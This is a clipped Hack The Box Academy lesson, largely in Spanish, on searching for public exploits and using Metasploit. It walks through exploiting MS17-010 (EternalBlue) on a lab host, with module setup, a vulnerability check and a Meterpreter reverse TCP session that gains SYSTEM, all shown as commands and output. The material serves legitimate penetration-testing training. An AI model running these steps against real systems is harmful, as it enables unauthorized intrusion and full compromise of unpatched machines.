---
title: "Hack The Box Academy"
source: "https://academy.hackthebox.com/app/module/77/section/843"
author:
published:
created: 2026-05-23
description:
tags:
  - "clippings"
---
## Explotaciones públicas

---

Una vez que identificamos los servicios que se ejecutan en los puertos identificados desde nuestro `Nmap` scan, el primer paso es ver si alguna de las aplicaciones/servicios tiene algún exploit público. Se pueden encontrar exploits públicos para aplicaciones web y otras aplicaciones que se ejecutan en puertos abiertos, como `SSH` o `ftp`.

---

## Encontrar exploits públicos

Muchas herramientas pueden ayudarnos a buscar exploits públicos para las diversas aplicaciones y servicios que podemos encontrar durante la fase de enumeración. Una forma es buscar en Google el nombre de la aplicación con `exploit` Para ver si obtenemos algún resultado:

https://www.google.com/

![Resultados de búsqueda de Google para 'Exploit para PYMES de Windows 7' que muestran enlaces a artículos sobre exploits de EternalBlue.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/google_smb.jpg)

Una herramienta muy conocida para este propósito es `searchsploit`, que podemos utilizar para buscar vulnerabilidades/explotaciones públicas para cualquier aplicación. Podemos instalarlo con el siguiente comando:

```
shellsessionaalonso1190@htb[/htb]$ sudo apt install exploitdb -y
```

Entonces, podemos usarlo `searchsploit` para buscar una aplicación específica por su nombre, de la siguiente manera:

```
shellsessionaalonso1190@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

También podemos utilizar bases de datos de exploits en línea para buscar vulnerabilidades, como [Explotar base de datos](https://www.exploit-db.com/), [Base de datos Rapid7](https://www.rapid7.com/db/), o [Laboratorio de vulnerabilidades](https://www.vulnerability-lab.com/). El [Introducción a las aplicaciones web](https://academy.hackthebox.com/module/details/75) El módulo analiza las vulnerabilidades públicas de las aplicaciones web.

---

## Introducción a Metasploit

Metasploit Framework (MSF) es una excelente herramienta para pentesters. Contiene muchos exploits integrados para muchas vulnerabilidades públicas y proporciona una forma sencilla de utilizar estos exploits contra objetivos vulnerables. MSF tiene muchas otras características, como:

- Ejecución de scripts de reconocimiento para enumerar hosts remotos y objetivos comprometidos
- Scripts de verificación para probar la existencia de una vulnerabilidad sin comprometer realmente el objetivo
- Meterpreter, que es una gran herramienta para conectarse a shells y ejecutar comandos en los objetivos comprometidos
- Muchas herramientas de post-explotación y pivotamiento

Tomemos un ejemplo básico de cómo buscar un exploit para una aplicación que estamos atacando y cómo explotarlo. Correr `Metasploit`, podemos usar el `msfconsole` comando:

```
shellsessionaalonso1190@htb[/htb]$ msfconsole

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

Una vez que lo hayamos hecho `Metasploit` En ejecución, podemos buscar nuestra aplicación de destino con el `search exploit` comando. Por ejemplo, podemos buscar la vulnerabilidad de las PYMES que identificamos anteriormente:

```
shellsessionmsf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

Consejo: La búsqueda puede aplicar filtros complejos como search cve:2009 type:exploit. Ver todos los filtros con ayuda de búsqueda

Encontramos un exploit para este servicio. Podemos usarlo copiando su nombre completo y usando `USE` Para usarlo:

```
shellsessionmsf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Antes de poder ejecutar el exploit, necesitamos configurar sus opciones. Para ver las opciones disponibles para configurar, podemos utilizar el `show options` comando:

```
shellsessionModule options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Cualquier opción con `Required` establecer en `yes` Es necesario configurarlo para que el exploit funcione. En este caso, solo tenemos dos opciones para configurar: `RHOSTS`, lo que significa la IP de nuestro destino (puede ser una IP, varias IP o un archivo que contenga una lista de IP). La segunda opción, `LHOST`, representa la IP de nuestro host de ataque (puede ser una sola IP o el nombre de una interfaz de red. En el siguiente ejemplo, `LHOST` se está configurando en la IP asociada con nuestro `tun0` interfaz.) Podemos configurarlos con el `set` comando:

```
shellsessionmsf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Una vez que tengamos ambas opciones configuradas, podremos iniciar la explotación. Sin embargo, antes de ejecutar el script, podemos ejecutar una verificación para asegurarnos de que el servidor sea vulnerable:

```
shellsessionmsf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

```
shellsessionmsf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

Later on, in this module, we will walk through the `Nibbles` box step-by-step and then show exploitation using `Metasploit`. `Metasploit` is another essential tool to add to our toolkit, but it is crucial not solely to rely on it. To be well-rounded testers, we must know how to best leverage all of the tools available to us, understand why they sometimes fail, and know when to pivot to manual techniques or other tools.

## Connect to HTB

Enable step-by-step solutions

PRO

- ## Question 1
	+1
	+20
	---